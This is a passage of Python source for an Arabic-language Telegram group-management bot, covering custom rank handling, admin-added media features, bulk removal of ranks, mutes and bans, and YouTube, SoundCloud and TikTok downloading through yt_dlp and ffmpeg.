         rank2 = r.get(f'{m.chat.id}:RankPre:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankPre:{Dev_Zaid}')
       if rank == 'عضو':
         rank2 = r.get(f'{m.chat.id}:RankMem:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankMem:{Dev_Zaid}')
       r.srem(f'{m.chat.id}:ranklist:{Dev_Zaid}',f'{rank}&&newr={rank2}')
       return m.reply(f'{k} مسحت رتبه ( {rank2} )')
   
   if text == 'مسح الرتب':
     if not mod_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
       if not r.smembers(f'{m.chat.id}:ranklist:{Dev_Zaid}'):
         return m.reply(f'{k} مافيه رتب مضافة')
       else:
         m.reply(f'{k} مسحت كل الرتب المضافة')
         r.delete(f'{m.chat.id}:RankGowner:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankOwner:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankMod:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankAdm:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankPre:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankMem:{Dev_Zaid}')
         return r.delete(f'{m.chat.id}:ranklist:{Dev_Zaid}')
   
   if text == 'قائمه الرتب' or text == 'قائمة الرتب':
     if not mod_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
       if not r.smembers(f'{m.chat.id}:ranklist:{Dev_Zaid}'):
         return m.reply(f'{k} مافيه رتب مضافة')
       else:
         txt = 'قائمة الرتب:\n'
         count = 1
         for rrr in r.smembers(f'{m.chat.id}:ranklist:{Dev_Zaid}'):
            rank = rrr.split('&&newr=')
            txt += f'{count}) {rank[0]} ~ ( {rank[1]} )\n'
            count += 1
         txt += '\n☆'
         return m.reply(txt, disable_web_page_preview=True)

   if text == 'مسح رتبه' or text == 'مسح رتبة':
     if not mod_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
       r.set(f'{m.from_user.id}:delRank:{m.chat.id}{Dev_Zaid}',1,ex=600)
       return m.reply(f'{k} ارسل اسم الرتبه اللي تبي تمسحها الحين')
   
   if text == 'تغيير رتبه' or text == 'تغيير رتبة':
     if not mod_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
       r.set(f'{m.from_user.id}:addRank:{m.chat.id}{Dev_Zaid}',1,ex=600)
       return m.reply(f'''
{k} ارسل الرتبه اللي تبي تغييرها

{k} مالك اساسي
{k} مالك
{k} مدير
{k} ادمن
{k} مميز
{k} عضو
☆''')
# ==================== FILE: custom_plugin.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy6"}

'''



@Client.on_message(filters.text & filters.group, group=31)
def addPluginHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=plugin_func,args=(c,m,k)).start()
    
def plugin_func(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
        return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   
   if r.get(f'{m.from_user.id}:setAddP4:{m.chat.id}{Dev_Zaid}') or r.get(f'{m.from_user.id}:setAddP:{m.chat.id}{Dev_Zaid}') or r.get(f'{m.from_user.id}:setAddP2:{m.chat.id}{Dev_Zaid}') or r.get(f'{m.from_user.id}:setAddP3:{m.chat.id}{Dev_Zaid}') or r.get(f'{m.from_user.id}:setAddP4:{m.chat.id}{Dev_Zaid}') or r.get(f'{m.from_user.id}:setDelp:{m.chat.id}{Dev_Zaid}'):
     if text == 'الغاء':
       m.reply(f'{k} ابشر ياعيني لغيت كلشي')
       r.delete(f'{m.from_user.id}:setAddP:{m.chat.id}{Dev_Zaid}')
       r.delete(f'{m.from_user.id}:setAddP2:{m.chat.id}{Dev_Zaid}')
       r.delete(f'{m.from_user.id}:setAddP3:{m.chat.id}{Dev_Zaid}')
       r.delete(f'{m.from_user.id}:setAddP4:{m.chat.id}{Dev_Zaid}')
       r.delete(f'{m.from_user.id}:setDelp:{m.chat.id}{Dev_Zaid}')
       return 
     
   if text == 'اضف ميزة' or text == 'اضف ميزه':
     if devp_pls(m.from_user.id,m.chat.id):
        r.set(f'{m.from_user.id}:setAddP:{m.chat.id}{Dev_Zaid}',1)
        return m.reply(f'{k} هلا عيني ارسل اسم الميزة الحين')
   
   if r.get(f'{m.from_user.id}:setAddP:{m.chat.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id) and len(m.text.split()) == 1:
      r.delete(f'{m.from_user.id}:setAddP:{m.chat.id}{Dev_Zaid}')
      r.set(f'{m.from_user.id}:setAddP2:{m.chat.id}{Dev_Zaid}',m.text)
      return m.reply(f'{k} تمام عيني ارسل نوع الميزة الحين ( صوره,فيديو,متحركه,بصمه,صوت)\n☆')
   
   if text in ['صوره','فيديو','متحركه','بصمه','صوت'] and r.get(f'{m.from_user.id}:setAddP2:{m.chat.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
      miza = r.get(f'{m.from_user.id}:setAddP2:{m.chat.id}{Dev_Zaid}')
      r.delete(f'{m.from_user.id}:setAddP2:{m.chat.id}{Dev_Zaid}')
      r.set(f'{m.from_user.id}:setAddP3:{m.chat.id}{Dev_Zaid}',f'miza={miza}&&type={m.text}')
      return m.reply(f'{k} ارسل يوزر القناة الحين')
   
   if r.get(f'{m.from_user.id}:setAddP3:{m.chat.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
      miza = r.get(f'{m.from_user.id}:setAddP3:{m.chat.id}{Dev_Zaid}')
      miza += f'&&channel={m.text.replace("@","")}'
      r.delete(f'{m.from_user.id}:setAddP3:{m.chat.id}{Dev_Zaid}')
      r.set(f'{m.from_user.id}:setAddP4:{m.chat.id}{Dev_Zaid}', miza)
      return m.reply(f'{k} ارسل الحين ايديات الرسايل العشوائية\n{k} مثال 1 - 100')
   
   if r.get(f'{m.from_user.id}:setAddP4:{m.chat.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
      miza = r.get(f'{m.from_user.id}:setAddP4:{m.chat.id}{Dev_Zaid}')
      id1 = int(m.text.split('-')[0])
      id2 = int(m.text.split('-')[1])
      r.delete(f'{m.from_user.id}:setAddP4:{m.chat.id}{Dev_Zaid}')
      miza_name = miza.split('miza=')[1].split('&&')[0]
      miza_type = miza.split('&&type=')[1].split('&&')[0]
      miza_channel = miza.split('&&channel=')[1].split('&&')[0]
      r.set(f'{miza_name}:customPlugin:{Dev_Zaid}', f'type={miza_type}&&channel={miza_channel}&&random={id1}_{id2}')
      r.sadd(f'customPlugins:{Dev_Zaid}', miza_name)
      return m.reply(f'{k} ابشر ضفت الميزة ( {miza_name} )\n{k} نوع الميزة {miza_type}\n{k} قناة الميزة ( @{miza_channel} )')
   
   if text == 'مسح ميزة' or text == 'مسح ميزه':
     if devp_pls(m.from_user.id,m.chat.id):
        r.set(f'{m.from_user.id}:setDelp:{m.chat.id}{Dev_Zaid}',1)
        return m.reply(f'{k} هلا عيني ارسل اسم الميزة الحين')
        
   if r.get(f'{m.from_user.id}:setDelp:{m.chat.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
     if not r.get(f'{m.text}:customPlugin:{Dev_Zaid}'):
       r.delete(f'{m.from_user.id}:setDelp:{m.chat.id}{Dev_Zaid}')
       return m.reply(f'{k} مافي ميزة بهالأسم')
     else:
       r.srem(f'customPlugins:{Dev_Zaid}', m.text)
       r.delete(f'{m.text}:customPlugin:{Dev_Zaid}')
       r.delete(f'{m.from_user.id}:setDelp:{m.chat.id}{Dev_Zaid}')
       r.delete(f'{m.text}:customPluginD:{Dev_Zaid}{m.chat.id}')
       return m.reply(f'{k} الميزة ( {m.text} ) مسحتها .')
   
   if text == 'المميزات المضافه':
     if devp_pls(m.from_user.id,m.chat.id):
       if not r.smembers(f'customPlugins:{Dev_Zaid}'):
         return m.reply(f'{k} مافي ولا ميزة مضافة')
       else:
         text = 'المميزات المضافه:\n\n'
         count = 1
         for miza in r.smembers(f'customPlugins:{Dev_Zaid}'):
            text += f'{count}) - {miza}\n'
            count += 1
         text += '\n☆'
         return m.reply(text)
   
   if r.get(f'{m.text}:customPlugin:{Dev_Zaid}'):
      if r.get(f'{m.text}:customPluginD:{Dev_Zaid}{m.chat.id}'):
         return
      else:
         miza = r.get(f'{m.text}:customPlugin:{Dev_Zaid}')
         type = miza.split('type=')[1].split('&&')[0]
         channel = miza.split('&&channel=')[1].split('&&')[0]
         random1 = int(miza.split('&&random=')[1].split('_')[0])
         random2 = int(miza.split('&&random=')[1].split('_')[1])
         rand = random.randint(random1,random2)
         if type == 'صوره':
            m.reply_photo(f'https://t.me/{channel}/{rand}')
         
         if type == 'فيديو':
            m.reply_video(f'https://t.me/{channel}/{rand}')
        
         if type == 'متحركه':
            m.reply_animation(f'https://t.me/{channel}/{rand}')
         
         if type == 'بصمه':
            m.reply_voice(f'https://t.me/{channel}/{rand}')
         
         if type == 'صوت':
            m.reply_audio(f'https://t.me/{channel}/{rand}')
   
   if text.startswith('تعطيل ') and len(text.split()) == 2:
      miza = text.split()[1]
      if r.get(f'{miza}:customPlugin:{Dev_Zaid}'):
        if not owner_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس') 
        else:
          if r.get(f'{miza}:customPluginD:{Dev_Zaid}{m.chat.id}'):
            return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ميزة {miza} معطله من قبل\n☆')
          else:
            r.set(f'{miza}:customPluginD:{Dev_Zaid}{m.chat.id}',1)
            return m.reply(f'من「 {m.from_user.mention} 」\n{k} ابشر عطلت ميزة {miza}\n☆')
   
   if text.startswith('تفعيل ') and len(text.split()) == 2:
      miza = text.split()[1]
      if r.get(f'{miza}:customPlugin:{Dev_Zaid}'):
        if not owner_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس') 
        else:
          if not r.get(f'{miza}:customPluginD:{Dev_Zaid}{m.chat.id}'):
            return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ميزة {miza} مفعله من قبل\n☆')
          else:
            r.delete(f'{miza}:customPluginD:{Dev_Zaid}{m.chat.id}')
            return m.reply(f'من「 {m.from_user.mention} 」\n{k} ابشر فعلت ميزة {miza}\n☆')
   
            
            
          
   
   
   
   
      
   
# ==================== FILE: del_ranks.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''



@Client.on_message(filters.text & filters.group, group=13)
def delRanksHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=del_ranks_func,args=(c,m,k)).start()
    

def del_ranks_func(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   if isLockCommand(m.from_user.id, m.chat.id, text): return
   id = m.from_user.id
   cid = m.chat.id
   demoted = '''{} ابشر عيني {}
{} مسحت ( {} ) من {} 
☆
'''
   if text == 'مسح قائمه Dev':
      if not devp_pls(id, cid):
        return m.reply(f'{k} هذا الامر يخص ( Dev🎖️) بس')
      else:
        if not r.smembers(f'{Dev_Zaid}DEV2'):
          return m.reply(f'{k} مافيه قائمة Dev²🎖')
        else:
          count = 0
          for dev2 in r.smembers(f'{Dev_Zaid}DEV2'):
             r.srem(f'{Dev_Zaid}DEV2', int(dev2))
             r.delete(f'{int(dev2)}:rankDEV2:{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'قائمة Dev'))
   
   if text == 'مسح قائمه MY':
      if not dev2_pls(id, cid):
        return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
      else:
        if not r.smembers(f'{Dev_Zaid}DEV'):
          return m.reply(f'{k} مافيه قائمة Myth🎖️')
        else:
          count = 0
          for dev in r.smembers(f'{Dev_Zaid}DEV'):
             r.srem(f'{Dev_Zaid}DEV', int(dev))
             r.delete(f'{int(dev)}:rankDEV:{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'قائمة MY'))
   
   if text == 'مسح المالكين الاساسيين':
      if not dev_pls(id, cid):
        return m.reply(f'{k} هذا الامر يخص ( Myth🎖️ مالك القروب وفوق) بس')
      else:
        if not r.smembers(f'{cid}:listGOWNER:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مالكين اساسيين')
        else:
          count = 0
          for gowner in r.smembers(f'{cid}:listGOWNER:{Dev_Zaid}'):
             r.srem(f'{cid}:listGOWNER:{Dev_Zaid}', int(gowner))
             r.delete(f'{cid}:rankGOWNER:{int(gowner)}{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'المالكين الاساسيين'))
   
   if text == 'مسح المالكين':
      if not gowner_pls(id, cid):
        return m.reply(f'{k} هذا الأمر يخص ( المالك الاساسي وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listOWNER:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مالكين ')
        else:
          count = 0
          for owner in r.smembers(f'{cid}:listOWNER:{Dev_Zaid}'):
             r.srem(f'{cid}:listOWNER:{Dev_Zaid}', int(owner))
             r.delete(f'{cid}:rankOWNER:{int(owner)}{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'المالكين'))
   
   if text == 'مسح المدراء':
      if not owner_pls(id, cid):
        return m.reply(f'{k} هذا الأمر يخص ( المالك وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listMOD:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مدراء')
        else:
          count = 0
          for MOD in r.smembers(f'{cid}:listMOD:{Dev_Zaid}'):
             r.srem(f'{cid}:listMOD:{Dev_Zaid}', int(MOD))
             r.delete(f'{cid}:rankMOD:{int(MOD)}{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'المدراء'))
   
   if text == 'مسح الادمنيه' or text == 'مسح الادمن':
      if not mod_pls(id, cid):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listADMIN:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه ادمن')
        else:
          count = 0
          for ADM in r.smembers(f'{cid}:listADMIN:{Dev_Zaid}'):
             r.srem(f'{cid}:listADMIN:{Dev_Zaid}', int(ADM))
             r.delete(f'{cid}:rankADMIN:{int(ADM)}{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'الادمن'))
   
   if text == 'مسح المميزين':
      if not mod_pls(id, cid):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listPRE:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مميزين')
        else:
          count = 0
          for MOD in r.smembers(f'{cid}:listPRE:{Dev_Zaid}'):
             r.srem(f'{cid}:listPRE:{Dev_Zaid}', int(MOD))
             r.delete(f'{cid}:rankPRE:{int(MOD)}{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'المميزين'))
   
   if text == 'مسح المكتومين':
      if not mod_pls(id, cid):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listMUTE:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مكتومين')
        else:
          count = 0
          for MOD in r.smembers(f'{cid}:listMUTE:{Dev_Zaid}'):
             try:
               mod = int(MOD)
             except:
               mod = MOD
             r.srem(f'{cid}:listMUTE:{Dev_Zaid}', mod)
             r.delete(f'{mod}:mute:{cid}{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'المكتومين'))
   
   if text == 'مسح المكتومين عام':
      if not dev_pls(id, cid):
        return m.reply(f'{k} هذا الامر يخص ( Myth🎖️ وفوق ) بس')
      else:
        if not r.smembers(f'listMUTE:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مكتومين عام')
        else:
          count = 0
          for MOD in r.smembers(f'listMUTE:{Dev_Zaid}'):
             r.srem(f'listMUTE:{Dev_Zaid}', int(MOD))
             r.delete(f'{int(MOD)}:mute:{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'المكتومين عام'))
   
   if text == 'مسح المحظورين عام':
      if not dev_pls(id, cid):
        return m.reply(f'{k} هذا الامر يخص ( Myth🎖️ وفوق ) بس')
      else:
        if not r.smembers(f'listGBAN:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه حمير محظورين')
        else:
          count = 0
          for MOD in r.smembers(f'listGBAN:{Dev_Zaid}'):
             r.srem(f'listGBAN:{Dev_Zaid}', int(MOD))
             r.delete(f'{int(MOD)}:gban:{Dev_Zaid}')
             count += 1
          m.reply(demoted.format(k,get_rank(id,cid),k,count,'الحمير المحظورين عام'))
          
             
       
   
   

# ==================== FILE: downloader.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''

#from pySmartDL import SmartDL

shazam = Shazam()

def time_to_seconds(time):
    stringt = str(time)
    return sum(
        int(x) * 60 ** i for i, x in enumerate(reversed(stringt.split(":")))
    )
    
# Redundant definition of Find removed

@Client.on_message(filters.text & filters.group, group=32)
def ytdownloaderHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'w7G_BoT'
    Thread(target=yt_func,args=(c,m,k,channel)).start()
    
def yt_func(c,m,k,channel):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
        return False 
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return False
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return False 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return False 
   text = m.text
   if isLockCommand(m.from_user.id, m.chat.id, text): return
   rep = InlineKeyboardMarkup (
     [[
       InlineKeyboardButton ('🧚‍♀️', url=f'https://t.me/{channel}')
     ]]
   )

   if text.startswith('يوت '):
     if r.get(f'{m.chat.id}:disableYT:{Dev_Zaid}'):  return
     if r.get(f':disableYT:{Dev_Zaid}'):  return
     query = text.split(None,1)[1]
     keyboard= []
     results=Y88F8(query,max_results=4).to_dict()
     for res in results:
       title = res['title']
       id = res['id']
       keyboard.append([InlineKeyboardButton (title, callback_data=f'{m.from_user.id}GET{id}')])     
     a = m.reply(f'{k} البحث ~ {query}',reply_markup=InlineKeyboardMarkup (keyboard), disable_web_page_preview=True)
     r.set(f'{a.id}:one_minute:{m.from_user.id}', 1, ex=60)
     return True
     
   
   if text.startswith('بحث ') or text.startswith('yt '):
     if r.get(f'{m.chat.id}:disableYT:{Dev_Zaid}'):  return
     if r.get(f':disableYT:{Dev_Zaid}'):  return
     query = text.split(None,1)[1]
     results=Y88F8(query,max_results=1).to_dict()
     res = results[0]
     title = res['title']
     duration= int(time_to_seconds(res['duration']))
     duration_string = time.strftime('%M:%S', time.gmtime(duration))
     if ytdb.get(f'ytvideo{res["id"]}'):
        aud = ytdb.get(f'ytvideo{res["id"]}')
        duration_string = time.strftime('%M:%S', time.gmtime(aud["duration"]))
        return m.reply_audio(aud["audio"],caption=f'@{channel} ~ {duration_string} ⏳',reply_markup=rep)
     url = f'https://youtu.be/{res["id"]}'
     yt = YouTube(url)
     if yt.length > 15555555:
         return m.reply("صوت فوق 25 دقيقة ما اقدر انزله",reply_markup=rep)
     else:
         duration_string = time.strftime('%M:%S', time.gmtime(yt.length))
         ydl_ops = {"format": "bestaudio[ext=m4a]",'forceduration':True, "username": "oauth2", "password": ''}
         with yt_dlp.YoutubeDL(ydl_ops) as ydl:
           info = ydl.extract_info(url, download=False)
           audio_file = ydl.prepare_filename(info)
           ydl.process_info(info)
         thumb = wget.download(yt.thumbnail_url)
         os.rename(audio_file,audio_file.replace(".m4a",".mp3"))
         audio_file = audio_file.replace(".m4a",".mp3")
         a = m.reply_audio(
         audio_file,
         title=yt.title,
         thumb=thumb,
         duration=yt.length,
         caption=f'@{channel} ~ {duration_string} ⏳',
         performer=yt.author,reply_markup=rep)
         ytdb.set(f'ytvideo{res["id"]}',{"type":"audio","audio":a.audio.file_id,"duration":a.audio.duration})
         os.remove(audio_file)
         os.remove(thumb)
         return True
  
   if text == "نسخة اليوتيوب" and m.from_user.id == 6168217372:
     if not ytdb.keys(): return m.reply("تخزين اليوتيوب فاضي")
     else:
        videos = []
        audios = []
        for key in ytdb.keys():
           get = {"key":key[0],"value":ytdb.get(key[0])}
           if get["value"]["type"] == "audio":
             audios.append(get)
           if get["value"]["type"] == "video":
             videos.append(get)
        id = random.randint(1,10000)
        if audios:
          with open(f"audios-{id}.json","w+") as f:
            f.write(json.dumps(audios, indent=4, ensure_ascii=False))
          m.reply_document(f"audios-{id}.json")
          os.remove(f"audios-{id}.json")
        if videos:
          with open(f"videos-{id}.json","w+") as f:
            f.write(json.dumps(videos, indent=4, ensure_ascii=False))
          m.reply_document(f"videos-{id}.json")
          os.remove(f"videos-{id}.json")
        return True

   if text.startswith('ساوند '):
     if r.get(f'{m.chat.id}:disableSound:{Dev_Zaid}'):  return
     if r.get(f':disableYT:{Dev_Zaid}'):  return
     #https://soundcloud.com
     query = text.split(None,1)[1]
     data = requests.get(f"https://m.soundcloud.com/search?q={query}")
     urls = re.findall(r'data-testid="cell-entity-link" href="([^"]+)', data.text)
     names = re.findall(r'<div class="Information_CellTitle__2KitR">([^<]+)', data.text)
     result = []
     for i in range(len(urls)): result.append({'name': names[i], 'url': f'{urls[i]}'})
     buttons = []
     btns = InlineKeyboardMarkup(buttons)
     count = 0
     for a in result:
       if count == 5:
         break
       url = a['url']
       buttons.append([
       InlineKeyboardButton (a['name'], switch_inline_query_current_chat=f'{url}#SOUND')
       ]
       )
       count += 1
     m.reply(f'{k} بحث الساوند ~ {query}', reply_markup=btns)
     return True
   
   if text.startswith('تيك '):
     if r.get(f'{m.chat.id}:disableTik:{Dev_Zaid}'):  return
     if r.get(f':disableYT:{Dev_Zaid}'):  return
     if Find(text):
       query = Find(text)[0]
     else:  return False
     with yt_dlp.YoutubeDL({}) as ytdl:
           vid_data = ytdl.extract_info(query, download=False)
     title=vid_data['fulltitle']
     duration=int(vid_data['duration'])
     string_d = time.strftime('%M:%S', time.gmtime(duration))
     uploader=vid_data['uploader']
     uploader_url=vid_data['uploader_url']
     creator=vid_data['creator']
     file_name=vid_data['url']
     url=vid_data['original_url']
     likes=vid_data['like_count']
     comments=vid_data['comment_count']
     views=vid_data['view_count']
     reposts=vid_data['repost_count']
     caption=f"`{title}`\n{k} طول المقطع : {string_d}\n{k} المشاهدات : {views:,}\n{k} اللايكات : {likes:,}\n{k} الكومنت : {comments:,}\n{k} الاكسبلور : {reposts:,}\n\n~ @{channel}"
     reply_markup=InlineKeyboardMarkup (
       [
       [InlineKeyboardButton (f"{creator} - @{uploader}",url=uploader_url)]
       ]
     )
     try:
       m.reply_video(file_name, caption=caption, reply_markup=reply_markup)
     except:
       with yt_dlp.YoutubeDL({}) as ytdl:
           vid_data = ytdl.extract_info(query[0].lower(), download=True)
           file_name = ytdl.prepare_filename(vid_data)
       m.reply_video(file_name, caption=caption, reply_markup=reply_markup)
       os.remove(file_name)
     return True

   if text.endswith(' #AUDIO'):
    find = Find(text)
    if find:
     url = find[0]
     if 'soundcloud' in url:
       if r.get(f'{m.chat.id}:disableSound:{Dev_Zaid}'):  return
       if r.get(f':disableYT:{Dev_Zaid}'):  return
       id = url.split('soundcloud.com/')[1]
       if sounddb.get(f'{id}:sound'):
          return m.reply_audio(sounddb.get(f'{id}:sound'))
       with yt_dlp.YoutubeDL({}) as ytdl:
           ytdl_dataa = ytdl.extract_info(url, download=False)
           if int(ytdl_dataa['duration']) > 155555555:
              return m.reply('مقطع اكثر من ٢٥ دقيقة مقدر انزله')
       with yt_dlp.YoutubeDL({}) as ytdl:
           ytdl_dataa = ytdl.extract_info(url, download=True)
           file_name = ytdl.prepare_filename(ytdl_dataa)
       title = ytdl_dataa['title']
       a = m.reply_audio(file_name,title=title, performer=f'@{channel}', duration=int(ytdl_dataa['duration']))       
       sounddb.set(f'{id}:sound',a.audio.file_id)
       os.remove(file_name)
       return True
   
   if text.endswith(' #VOICE'):
    find = Find(text)
    if find:
     url = find[0]
     if 'soundcloud' in url:
       if r.get(f'{m.chat.id}:disableSound:{Dev_Zaid}'):  return
       if r.get(f':disableYT:{Dev_Zaid}'):  return
       idd = url.split('soundcloud.com/')[1]
       if sounddb.get(f'{idd}:soundVoice'):
          return m.reply_voice(sounddb.get(f'{idd}:soundVoice'))
       with yt_dlp.YoutubeDL({}) as ytdl:
           ytdl_dataa = ytdl.extract_info(url, download=False)
           if int(ytdl_dataa['duration']) > 55555252:
              return m.reply('مقطع اكثر من ٢٥ دقيقة مقدر انزله')
       with yt_dlp.YoutubeDL({}) as ytdl:
           ytdl_dataa = ytdl.extract_info(url, download=True)
           file_name = ytdl.prepare_filename(ytdl_dataa)
       id = random.randint(1,100)
       os.rename(file_name, f"zaid{id}.mp3")
       os.system(f'ffmpeg -i zaid{id}.mp3 -ac 1 -strict -2 -codec:a libopus -b:a 128k -vbr off -ar 24000 zaid{id}.ogg')
       a = m.reply_voice(f"zaid{id}.ogg")       
       sounddb.set(f'{idd}:soundVoice',a.voice.file_id)
       os.remove(f"zaid{id}.mp3")
       os.remove(f"zaid{id}.ogg")
       return True
   
   find = Find(text)
   if find:
     url = find[0]
     if 'soundcloud' in url:
       if r.get(f'{m.chat.id}:disableSound:{Dev_Zaid}'):  return
       if r.get(f':disableYT:{Dev_Zaid}'):  return
       id = url.split('soundcloud.com')[1]
       return m.reply(f"@{channel} - ☁️",reply_markup=InlineKeyboardMarkup ([
       [InlineKeyboardButton ("اضغط هنا لاختيار صيغة التحميل", switch_inline_query_current_chat=f'{id}#SOUND')],
       [InlineKeyboardButton ("☁️", url=f't.me/{channel}')],
       ]))
       
       
     
@Client.on_message(filters.regex("^شازام$") & filters.group)
async def shazamFunc(c,m):
   if r.get(f'{m.chat.id}:disableShazam:{Dev_Zaid}'):  return False
   if m.reply_to_message and (m.reply_to_message.audio or m.reply_to_message.voice or m.reply_to_message.video):
     if m.reply_to_message.audio:
       duration=m.reply_to_message.audio.duration if m.reply_to_message.audio.duration else 301
       fileSize=m.reply_to_message.audio.file_size
     if m.reply_to_message.voice:
